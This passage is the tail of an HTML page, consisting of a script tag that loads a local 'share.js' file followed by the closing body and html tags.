<script src="../assets/javascripts/share.js"></script>
</body>
</html>